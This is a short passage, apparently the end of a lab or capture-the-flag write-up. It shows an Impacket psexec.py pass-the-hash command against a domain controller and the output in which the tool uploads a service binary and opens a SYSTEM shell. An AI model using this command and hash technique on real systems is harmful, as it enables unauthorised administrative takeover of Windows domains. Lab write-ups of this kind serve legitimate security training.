└──╼ #psexec.py cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC-JPQ225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file lmvjBUSx.exe
[*] Opening SVCManager on DC-JPQ225.cicada.vl.....
[*] Creating service Eepb on DC-JPQ225.cicada.vl.....
[*] Starting service Eepb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

That completed the machine.
